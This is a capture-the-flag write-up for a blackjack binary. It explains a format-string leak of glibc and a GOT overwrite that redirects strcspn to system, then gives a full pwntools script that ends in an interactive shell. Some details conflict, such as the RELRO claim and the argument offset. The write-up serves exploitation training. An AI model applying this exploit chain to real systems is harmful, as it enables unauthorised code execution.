# BlackJack

## Introduction
This challenge includes a [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/dalctf2026/blackjack) , 
[source code](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/dalctf2026/blackjack.c) , the [loader](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/dalctf2026/ld-linux-x86-64.so.2) and [libc](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/dalctf2026/libc.so.6) binaries.
upon first look, it appears to be a simple blackjack game:
```fish
[I] ◆ blackjack ❯❯❯ ./blackjack
+===========================================+
|       Welcome to Boundary Casino!         |
|    Here all tech works well and fast!     |
|  Beat the dealer and claim your prize.    |
+===========================================+


--- New Hand ---
Dealer shows: 5 [?] (5)
Your hand   : 8 2 (10)
(h)it or (s)tand? h
You drew: 4. Hand: 8 2 4 (14)
(h)it or (s)tand? h
You drew: 3. Hand: 8 2 4 3 (17)
(h)it or (s)tand? h
You drew: 4. Hand: 8 2 4 3 4 (21)
Blackjack!
Dealer reveals: Dealer hand : 5 5 (10)
Dealer hits: A. Dealer: 21
You: 21  |  Dealer: 21
Push. It's a tie.
Play another hand? [y/n]:
```

## Source code analysis
Simple analysis of the source code reveals a format
string bug and a buffer overflow:
```c
#define NAME_BUF  64
        // ...
    void game_loop(void) {
        char name[NAME_BUF];
        // ...
    while (1) {
        won = play_hand();

        if (won) {
            printf("\n*** You win! ***\n");
            printf("The casino will deposit your winnings.\n");
            printf("Enter your name for the transaction record: ");
            fgets(name, 256, stdin);
            name[strcspn(name, "\n")] = '\0';
            printf("Processing transaction for: ");
            printf(name);               
            printf("\n\n");
        }
    // ...

```
## Glibc Leaks
We can use the format string bug to leak glibc addresses.
The first user-controlled arguments is number `8`, and some
trial and error reveals that the return address of `main`
is at offset 43, meaning the `%43$lx` payload will leak the address

## GOT overwrites
then use this bug again to overwrite GOT entries. The binary
has the following protections:
```fish
[I] ◆ blackjack ❯❯❯ pwn checksec blackjack
[*] '/home/init-freedom/DalCTF/blackjack/blackjack'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    Stripped:   No
    Debuginfo:  Yes
```
Since there is no PIE or RELRO, the attack should succeed

looking at the source code for interesting calls, we see the following:
```c
       if (won) {
            printf("\n*** You win! ***\n");
            printf("The casino will deposit your winnings.\n");
            printf("Enter your name for the transaction record: ");
            fgets(name, 256, stdin);
            name[strcspn(name, "\n")] = '\0';
            printf("Processing transaction for: ");
            printf(name);               
            printf("\n\n");
        }

        printf("Play another hand? [y/n]: ");
        fflush(stdout);
        int ch = fgetc(stdin);
        int tmp;
        while ((tmp = fgetc(stdin)) != '\n' && tmp != EOF);
        if (ch != 'y' && ch != 'Y') break;
    }
```
The call to `fgets` could be used, as overwriting the
GOT entry to point to `system` would allow to call
`system("/bin/sh")`. The plan then is:
1. leak GLibc base
2. overwrite the GOT entry of `strcspn`
3. win the game one last time and execute `system`

## Final exploit
With those in mind, we then get the following exploit:
```python
from pwn import *
import random
context.terminal = ['alacritty','-e']
context.arch = 'amd64'
target = process("./blackjack")
elf = target.elf
libc = elf.libc
if not libc:
    raise RuntimeError("No LIBC.WTF???")
def win():
    buffer = b''
    counter = 0
    while b'*** You win! ***' not in buffer:
        print(counter)
        print(buffer)
        counter += 1
        buffer = target.recv(timeout=1)
        if b'Blackjack!' in buffer:
            break
        elif b'(h)it' in buffer:
            print('hit')
            if random.random() >= 0.5:
                target.sendline(b'h')
            else:
                target.sendline(b's')
        elif b'hand? [y/n]:' in buffer: 
            print('hand')
            target.sendline(b'y')
win()
payload = b"--%43$lx"
target.sendline(payload)
target.recvuntil(b"--")
txt = target.recvline()
addr = int(txt,16)
libc.address = addr - (libc.symbols['__libc_start_main']+0x8b)
print(hex(addr))
print(hex(libc.address))
win()
writes = {
        elf.got['strcspn']:libc.symbols['system']}
payload = b'/bin/bash -i    '+fmtstr_payload(offset=10,numbwritten=16,writes=writes)
print(len(payload))
target.sendline(payload)
win()
target.interactive()
```
`win()` simply plays the blackjack game until it wins it.
